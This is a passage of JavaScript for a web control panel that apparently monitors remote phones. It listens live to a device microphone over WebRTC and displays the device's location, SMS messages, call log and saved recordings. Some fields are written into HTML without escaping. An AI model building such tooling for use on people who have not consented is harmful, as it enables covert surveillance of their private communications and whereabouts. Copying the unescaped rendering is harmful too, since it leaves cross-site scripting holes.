        pc.addTransceiver("audio", { direction: "recvonly" });
        try {
          const offer = await pc.createOffer();
          await pc.setLocalDescription(offer);

          const btn = document.getElementById(`btnRtc_${deviceId}`);
          if (btn) { btn.textContent = "⚡ WebRTC On"; btn.classList.add("active"); }
          const liveBtn = document.getElementById(`btnLive_${deviceId}`);
          if (liveBtn) { liveBtn.textContent = "⏸ Stop Listen"; liveBtn.classList.add("active"); }

          sendCmd(deviceId, "webrtc_start");
          sendCmd(deviceId, "webrtc_offer", { sdp: offer.sdp });
          log(`WebRTC offer sent to ${deviceId}`, "ok");
          state.rtcConnectDeadlineTimer = setTimeout(() => {
            state.rtcConnectDeadlineTimer = null;
            if (!state.rtcConnected && state.useWebRtc) {
              log(`WebRTC connect timed out for ${deviceId} — falling back to PCM`, "warn");
              stopWebRtc(deviceId, true);
              if (state.isLive) sendCmd(deviceId, "start_stream");
            }
          }, 12000);
          return true;
        } catch (e) {
          log(`WebRTC offer failed for ${deviceId}: ${e.message}`, "err");
          stopWebRtc(deviceId, false);
          return false;
        }
      }

      function stopWebRtc(deviceId, notifyServer) {
        const state = deviceState[deviceId];
        if (!state) return;
        if (state.rtcPeer) {
          state.rtcPeer.ontrack = null;
          state.rtcPeer.onicecandidate = null;
          state.rtcPeer.oniceconnectionstatechange = null;
          state.rtcPeer.close();
        }
        if (state.rtcConnectDeadlineTimer) {
          clearTimeout(state.rtcConnectDeadlineTimer);
          state.rtcConnectDeadlineTimer = null;
        }
        if (state.rtcRestartTimer) {
          clearTimeout(state.rtcRestartTimer);
          state.rtcRestartTimer = null;
        }
        if (state.rtcStatsTimer) {
          clearInterval(state.rtcStatsTimer);
          state.rtcStatsTimer = null;
        }
        state.rtcPeer = null;
        state.useWebRtc = false;
        state.rtcConnected = false;
        state.webRtcRetryOnNotFoundDone = false;
        if (state.remoteAudioEl) state.remoteAudioEl.srcObject = null;
        teardownWebRtcPlaybackBoost(state);
        const btn = document.getElementById(`btnRtc_${deviceId}`);
        if (btn) { btn.textContent = "⚡ WebRTC"; btn.classList.remove("active"); }
        if (notifyServer) sendCmd(deviceId, "webrtc_stop");
      }

      function setupWebRtcPlaybackBoost(deviceId, state, stream) {
        if (!state || !stream) return;
        if (state.remoteAudioEl) {
          state.remoteAudioEl.srcObject = stream;
          state.remoteAudioEl.muted = false;
          state.remoteAudioEl.volume = 1.0;
          state.remoteAudioEl.play?.().catch(() => {});
        }
        const Ctx = window.AudioContext || window.webkitAudioContext;
        if (!Ctx) return;
        let graphActive = false;
        try {
          if (!state.webRtcAudioCtx) state.webRtcAudioCtx = new Ctx({ latencyHint: "interactive" });
          if (state.webRtcAudioCtx.state === "suspended") state.webRtcAudioCtx.resume();
          if (!state.webRtcGainNode) {
            state.webRtcGainNode = state.webRtcAudioCtx.createGain();
            state.webRtcGainNode.gain.value = 1.85;
          }
          if (!state.webRtcCompressorNode) {
            state.webRtcCompressorNode = state.webRtcAudioCtx.createDynamicsCompressor();
            state.webRtcCompressorNode.threshold.value = -16;
            state.webRtcCompressorNode.knee.value = 24;
            state.webRtcCompressorNode.ratio.value = 3.2;
            state.webRtcCompressorNode.attack.value = 0.003;
            state.webRtcCompressorNode.release.value = 0.2;
          }
          if (state.webRtcSourceNode) {
            try { state.webRtcSourceNode.disconnect(); } catch (_) {}
          }
          state.webRtcSourceNode = state.webRtcAudioCtx.createMediaStreamSource(stream);
          if (!state.webRtcAudioGraphConnected) {
            state.webRtcGainNode.connect(state.webRtcCompressorNode);
            state.webRtcCompressorNode.connect(state.webRtcAudioCtx.destination);
            state.webRtcAudioGraphConnected = true;
          }
          state.webRtcSourceNode.connect(state.webRtcGainNode);
          startWebRtcInputMeter(deviceId, state);
          graphActive = true;
        } catch (e) {
          log(`WebRTC audio boost disabled: ${e.message}`, "warn");
        }
        // Keep direct element playback as fail-safe if graph is not active.
        if (state.remoteAudioEl) {
          state.remoteAudioEl.muted = graphActive;
          state.remoteAudioEl.play?.().catch(() => {});
        }
      }

      function teardownWebRtcPlaybackBoost(state) {
        if (!state) return;
        if (state.webRtcMeterTimer) {
          clearInterval(state.webRtcMeterTimer);
          state.webRtcMeterTimer = null;
        }
        if (state.webRtcSourceNode) {
          try { state.webRtcSourceNode.disconnect(); } catch (_) {}
        }
        if (state.webRtcAnalyserNode) {
          try { state.webRtcAnalyserNode.disconnect(); } catch (_) {}
        }
        if (state.webRtcGainNode) {
          try { state.webRtcGainNode.disconnect(); } catch (_) {}
        }
        if (state.webRtcCompressorNode) {
          try { state.webRtcCompressorNode.disconnect(); } catch (_) {}
        }
        if (state.webRtcAudioCtx) {
          try { state.webRtcAudioCtx.close(); } catch (_) {}
        }
        state.webRtcSourceNode = null;
        state.webRtcAnalyserNode = null;
        state.webRtcMeterData = null;
        state.webRtcInboundRms = 0;
        state.rtcRxPacketsPerSec = 0;
        state.rtcRxKbps = 0;
        state.rtcRxMetricText = "-";
        state.rtcLastPacketsReceived = null;
        state.rtcLastBytesReceived = null;
        state.rtcLastPacketsTs = null;
        state.webRtcGainNode = null;
        state.webRtcCompressorNode = null;
        state.webRtcAudioCtx = null;
        state.webRtcAudioGraphConnected = false;
      }

      function startWebRtcInputMeter(deviceId, state) {
        if (!state?.webRtcAudioCtx || !state?.webRtcSourceNode) return;
        if (!state.webRtcAnalyserNode) {
          state.webRtcAnalyserNode = state.webRtcAudioCtx.createAnalyser();
          state.webRtcAnalyserNode.fftSize = 1024;
          state.webRtcAnalyserNode.smoothingTimeConstant = 0.6;
        }
        try { state.webRtcSourceNode.connect(state.webRtcAnalyserNode); } catch (_) {}
        if (!state.webRtcMeterData || state.webRtcMeterData.length !== state.webRtcAnalyserNode.fftSize) {
          state.webRtcMeterData = new Float32Array(state.webRtcAnalyserNode.fftSize);
        }
        if (state.webRtcMeterTimer) clearInterval(state.webRtcMeterTimer);
        state.webRtcMeterTimer = setInterval(() => {
          if (!state.useWebRtc || !state.webRtcAnalyserNode || !state.webRtcMeterData) return;
          if (state.webRtcAudioCtx && state.webRtcAudioCtx.state === 'suspended') {
            state.webRtcAudioCtx.resume().catch(() => {});
          }
          try {
            state.webRtcAnalyserNode.getFloatTimeDomainData(state.webRtcMeterData);
            let sum = 0;
            for (let i = 0; i < state.webRtcMeterData.length; i++) {
              const v = state.webRtcMeterData[i];
              sum += v * v;
            }
            state.webRtcInboundRms = Math.sqrt(sum / state.webRtcMeterData.length);
            const rmsEl = document.getElementById(`hrms_${deviceId}`);
            if (rmsEl) {
              const pct = Math.max(0, Math.min(100, Math.round(state.webRtcInboundRms * 100)));
              const cls = pct >= 8 ? "ok-text" : (pct > 0 ? "" : "bad-text");
              rmsEl.innerHTML = `<span class="${cls}">${pct}%</span>`;
            }
          } catch (_) {}
        }, 250);
      }

      async function onWebRtcAnswer(deviceId, sdp) {
        const state = deviceState[deviceId];
        if (!state || !state.rtcPeer || !sdp) return;
        try {
          await state.rtcPeer.setRemoteDescription({ type: "answer", sdp });
          log(`WebRTC answer applied for ${deviceId}`, "ok");
        } catch (e) {
          log(`WebRTC answer error for ${deviceId}: ${e.message}`, "err");
        }
      }

      async function onWebRtcIce(deviceId, candidate) {
        const state = deviceState[deviceId];
        if (!state || !state.rtcPeer || !candidate) return;
        try {
          await state.rtcPeer.addIceCandidate(candidate);
        } catch (e) {
          log(`WebRTC ICE add failed for ${deviceId}: ${e.message}`, "warn");
        }
      }

      function scheduleIceRecovery(deviceId, state, reason) {
        if (!state || !state.rtcPeer || !state.useWebRtc) return;
        if (state.rtcRestartTimer) clearTimeout(state.rtcRestartTimer);
        if (state.rtcRetryCount >= 3) {
          log(`WebRTC unstable for ${deviceId} (${reason}) — fallback to PCM`, "warn");
          stopWebRtc(deviceId, true);
          sendCmd(deviceId, "start_stream");
          return;
        }
        const delayMs = 600 + state.rtcRetryCount * 700;
        state.rtcRestartTimer = setTimeout(async () => {
          if (!state.rtcPeer || !state.useWebRtc) return;
          state.rtcRetryCount += 1;
          try {
            if (typeof state.rtcPeer.restartIce === "function") state.rtcPeer.restartIce();
            const offer = await state.rtcPeer.createOffer({ iceRestart: true });
            await state.rtcPeer.setLocalDescription(offer);
            sendCmd(deviceId, "webrtc_offer", { sdp: offer.sdp });
            log(`WebRTC ICE restart #${state.rtcRetryCount} sent for ${deviceId}`, "warn");
          } catch (e) {
            log(`WebRTC ICE restart failed for ${deviceId}: ${e.message}`, "err");
          }
        }, delayMs);
      }

      function startStatsLoop(deviceId, state) {
        if (!state || !state.rtcPeer) return;
        if (state.rtcStatsTimer) clearInterval(state.rtcStatsTimer);
        state.rtcLastPacketsReceived = null;
        state.rtcLastBytesReceived = null;
        state.rtcLastPacketsTs = null;
        state.rtcRxPacketsPerSec = 0;
        state.rtcRxKbps = 0;
        state.rtcRxMetricText = "-";
        state.rtcStatsTimer = setInterval(async () => {
          if (!state.rtcPeer || !state.useWebRtc) return;
          if (state.webRtcAudioCtx && state.webRtcAudioCtx.state === 'suspended') {
            state.webRtcAudioCtx.resume().catch(() => {});
          }
          try {
            const stats = await state.rtcPeer.getStats();
            const quality = extractQualityFromStats(stats);
            const nowMs = Date.now();
            let packetsReceivedNow = null;
            let bytesReceivedNow = null;
            stats.forEach((s) => {
              const isAudioInbound = s.type === "inbound-rtp" && (s.kind === "audio" || s.mediaType === "audio");
              if (!isAudioInbound) return;
              if (Number.isFinite(Number(s.packetsReceived))) {
                packetsReceivedNow = Number(s.packetsReceived);
              }
              if (Number.isFinite(Number(s.bytesReceived))) {
                bytesReceivedNow = Number(s.bytesReceived);
              }
            });
            if (state.rtcLastPacketsTs != null) {
              const dtSec = Math.max(0.001, (nowMs - state.rtcLastPacketsTs) / 1000);
              if (packetsReceivedNow != null && state.rtcLastPacketsReceived != null) {
                const dp = Math.max(0, packetsReceivedNow - state.rtcLastPacketsReceived);
                state.rtcRxPacketsPerSec = dp / dtSec;
                state.rtcRxMetricText = `${state.rtcRxPacketsPerSec.toFixed(1)} p/s`;
              } else if (bytesReceivedNow != null && state.rtcLastBytesReceived != null) {
                const db = Math.max(0, bytesReceivedNow - state.rtcLastBytesReceived);
                state.rtcRxKbps = (db * 8) / dtSec / 1000;
                state.rtcRxMetricText = `${state.rtcRxKbps.toFixed(1)} kb/s`;
              }
            }
            if (packetsReceivedNow != null) {
              state.rtcLastPacketsReceived = packetsReceivedNow;
            }
            if (bytesReceivedNow != null) {
              state.rtcLastBytesReceived = bytesReceivedNow;
            }
            if (packetsReceivedNow == null && bytesReceivedNow == null && state.rtcLastPacketsTs != null) {
              state.rtcRxPacketsPerSec = 0;
              state.rtcRxKbps = 0;
              state.rtcRxMetricText = "0.0";
            }
            state.rtcLastPacketsTs = nowMs;
            state.health = state.health || {};
            state.health.quality = quality;
            renderDeviceHealth(deviceId, state.health);
            sendCmd(deviceId, "webrtc_quality", { quality });
          } catch (_) {}
        }, 3000);
      }

      function extractQualityFromStats(stats) {
        let rttMs = null;
        let jitterMs = null;
        let packetsLost = null;
        let packetsReceived = null;
        stats.forEach((s) => {
          if (s.type === "candidate-pair" && (s.nominated || s.selected) && Number.isFinite(Number(s.currentRoundTripTime))) {
            rttMs = Number(s.currentRoundTripTime) * 1000;
          }
          if (s.type === "inbound-rtp" && (s.kind === "audio" || s.mediaType === "audio")) {
            if (Number.isFinite(Number(s.jitter))) jitterMs = Number(s.jitter) * 1000;
            if (Number.isFinite(Number(s.packetsLost))) packetsLost = Number(s.packetsLost);
            if (Number.isFinite(Number(s.packetsReceived))) packetsReceived = Number(s.packetsReceived);
          }
        });
        let lossPct = null;
        if (packetsLost != null && packetsReceived != null) {
          const total = packetsLost + packetsReceived;
          if (total > 0) lossPct = (packetsLost * 100.0) / total;
        }
        return {
          rttMs: rttMs != null ? Math.max(0, rttMs) : null,
          jitterMs: jitterMs != null ? Math.max(0, jitterMs) : null,
          lossPct: lossPct != null ? Math.max(0, lossPct) : null,
        };
      }

      async function loadWebRtcConfig() {
        try {
          const r = await fetch(`/api/webrtc-config`, { cache: "no-store" });
          if (!r.ok) return;
          const json = await r.json();
          if (json && Array.isArray(json.iceServers) && json.iceServers.length > 0) {
            webRtcConfig = {
              iceServers: json.iceServers,
              tokenRequired: !!json.tokenRequired,
            };
          }
        } catch (e) {
          log(`WebRTC config fetch failed: ${e.message}`, "warn");
        }
      }

      function openTab(deviceId, tab, btn) {
        ["location","sms","calls"].forEach((t) => {
          const p = document.getElementById(`tab_${deviceId}_${t}`);
          if (p) p.classList.remove("active");
        });
        document.getElementById(`card_${deviceId}`).querySelectorAll(".tab-btn").forEach((b) => b.classList.remove("active"));
        const panel = document.getElementById(`tab_${deviceId}_${tab}`);
        if (panel) panel.classList.add("active");
        if (btn) btn.classList.add("active");
      }

      function renderDeviceData(deviceId, data) {
        if (!data) return;
        // Auto-create card if data arrives before device_connected (e.g. race or reconnect)
        if (!deviceState[deviceId]) addDeviceCard(deviceId, "Unknown", null);
        const locEl = document.getElementById(`tab_${deviceId}_location`);
        if (locEl && data.location) {
          const l = data.location;
          if (l.error) {
            locEl.innerHTML = `<div class="data-row"><span class="data-val" style="color:var(--red)">⚠ ${l.error}</span></div>`;
          } else {
            const mapsUrl = `https://maps.google.com/?q=${l.lat},${l.lon}`;
            locEl.innerHTML = `
              <div class="data-row"><span class="data-label">Coordinates</span><span class="data-val"><a href="${mapsUrl}" target="_blank" style="color:var(--cyan)">${l.lat.toFixed(6)}, ${l.lon.toFixed(6)}</a></span></div>
              <div class="data-row"><span class="data-label">Accuracy</span><span class="data-val">${l.accuracy ? l.accuracy.toFixed(1)+" m" : "N/A"}</span></div>
              <div class="data-row"><span class="data-label">Provider</span><span class="data-val">${l.provider || "N/A"}</span></div>
              <div class="data-row"><span class="data-label">Time</span><span class="data-val">${l.time ? new Date(l.time).toLocaleString() : "N/A"}</span></div>`;
          }
        }
        const smsEl = document.getElementById(`tab_${deviceId}_sms`);
        if (smsEl && data.sms) {
          if (!data.sms.length) {
            smsEl.innerHTML = `<div class="data-row"><span class="data-label">No SMS found or permission denied</span></div>`;
          } else {
            smsEl.innerHTML = data.sms.map((s) => `
              <div class="data-row">
                <div><span class="data-val" style="font-weight:600">${s.address||"Unknown"}</span>
                     <span class="data-badge badge-${s.type}">${s.type}</span>
                     ${!s.read ? '<span class="data-badge badge-unread">UNREAD</span>' : ""}
                     <span class="data-label" style="float:right">${new Date(s.date).toLocaleString()}</span></div>
                <span class="data-val">${escHtml(s.body||"")}</span>
              </div>`).join("");
          }
        }
        const callsEl = document.getElementById(`tab_${deviceId}_calls`);
        if (callsEl && data.callLog) {
          if (!data.callLog.length) {
            callsEl.innerHTML = `<div class="data-row"><span class="data-label">No calls found or permission denied</span></div>`;
          } else {
            callsEl.innerHTML = data.callLog.map((c) => `
              <div class="data-row">
                <div><span class="data-val" style="font-weight:600">${c.name||c.number||"Unknown"}</span>
                     ${c.name ? `<span class="data-label"> ${c.number}</span>` : ""}
                     <span class="data-badge badge-${c.type==="incoming"?"in":c.type==="outgoing"?"out":"missed"}">${c.type}</span>
                     <span class="data-label" style="float:right">${new Date(c.date).toLocaleString()}</span></div>
                <span class="data-label">Duration: ${formatDuration(c.duration)}</span>
              </div>`).join("");
          }
        }
        log(`📊 Data received from ${deviceId.substring(0,8)}`, "info");
      }

      function escHtml(str) {
        return String(str).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
      }
      function formatDuration(secs) {
        if (!secs) return "0s";
        const m = Math.floor(secs/60), s = secs%60;
        return m > 0 ? `${m}m ${s}s` : `${s}s`;
      }

      function arrayBufferToFloat32(data, callback) {
        const reader = new FileReader();
        reader.onload = (e) => {
          const int16 = new Int16Array(e.target.result);
          const float32 = new Float32Array(int16.length);
          for (let i = 0; i < int16.length; i++) float32[i] = int16[i] / 32768.0;
          callback(float32);
        };
        reader.readAsArrayBuffer(data instanceof Blob ? data : new Blob([data]));
      }

      function playAudioChunk(state, float32) {
        if (!state.audioCtx || float32.length === 0) return;
        // Ensure AudioContext is running before scheduling audio
        if (state.audioCtx.state === "suspended") { state.audioCtx.resume(); }
        try {
          const buffer = state.audioCtx.createBuffer(1, float32.length, 16000);
          buffer.copyToChannel(float32, 0);
          const source = state.audioCtx.createBufferSource();
          source.buffer = buffer;
          source.connect(state.audioCtx.destination);
          const now = state.audioCtx.currentTime;
          const targetLeadSec = 0.02;
          const maxLeadSec = 0.2;
          if (state.nextPlayTime < now - 0.06) state.nextPlayTime = now + targetLeadSec;
          if (state.nextPlayTime > now + maxLeadSec) return;
          source.start(state.nextPlayTime);
          state.nextPlayTime += buffer.duration;
        } catch (e) {
          if (state.audioCtx && state.audioCtx.state === "suspended") state.audioCtx.resume();
        }
      }

      function drawWaveform(canvas, float32) {
        if (!canvas) return;
        const ctx = canvas.getContext("2d");
        const W = canvas.width, H = canvas.height, mid = H/2;
        ctx.clearRect(0,0,W,H);
        ctx.fillStyle = "#0a1628";
        ctx.fillRect(0,0,W,H);
        const grad = ctx.createLinearGradient(0,0,W,0);
        grad.addColorStop(0,"#3b82f6"); grad.addColorStop(0.5,"#06b6d4"); grad.addColorStop(1,"#3b82f6");
        ctx.beginPath(); ctx.strokeStyle = grad; ctx.lineWidth = 1.5;
        const step = Math.ceil(float32.length/W);
        for (let x = 0; x < W; x++) {
          const y = mid + (float32[x*step]||0) * mid * 0.9;
          x === 0 ? ctx.moveTo(x,y) : ctx.lineTo(x,y);
        }
        ctx.stroke();
      }

      function clearCanvas(canvas) {
        if (!canvas) return;
        const ctx = canvas.getContext("2d");
        ctx.fillStyle = "#0a1628";
        ctx.fillRect(0,0,canvas.width,canvas.height);
      }

      function refreshRecordingsList() {
        fetch("/api/recordings").then((r) => r.json()).then((files) => {
          const el = document.getElementById("globalRecList");
          if (!files || !files.length) { el.innerHTML = `<div class="rec-empty">No recordings yet.</div>`; return; }
          files.sort((a,b) => b.name.localeCompare(a.name));
          el.innerHTML = files.map((f) =>
            `<div class="rec-item">
               <a href="/recordings/${f.name}" download="${f.name}" title="${f.name}">⬇ ${f.name}</a>
               <span class="rec-size">${formatSize(f.size)}</span>
             </div>`).join("");
        }).catch(()=>{});
      }

      function formatSize(bytes) {
        if (bytes < 1024) return bytes+" B";
        if (bytes < 1048576) return (bytes/1024).toFixed(1)+" KB";
        return (bytes/1048576).toFixed(1)+" MB";
      }

      function setWsStatus(connected) {
        document.getElementById("wsDot").className = "conn-dot" + (connected ? " connected" : "");
        document.getElementById("wsStatus").textContent = connected ? "Connected" : "Disconnected";
        document.getElementById("connPill").className = "conn-pill" + (connected ? " ok" : "");
      }

      function log(message, level = "info") {
        const out = document.getElementById("logOutput");
        const entry = document.createElement("div");
        entry.className = "log-entry";
        entry.innerHTML = `<span class="log-ts">${new Date().toLocaleTimeString()}</span><span class="log-${level}">${message}</span>`;
        out.insertBefore(entry, out.firstChild);
        while (out.children.length > 200) out.removeChild(out.lastChild);
      }

      // Keep "x sec ago" fields fresh without waiting for new packets.
      setInterval(() => {
        Object.keys(deviceState).forEach((id) => renderDeviceHealth(id));
      }, 2000);

      loadWebRtcConfig().finally(connectControlWs);
      refreshRecordingsList();
      setInterval(refreshRecordingsList, 10000);
    </script>
  </body>
</html>
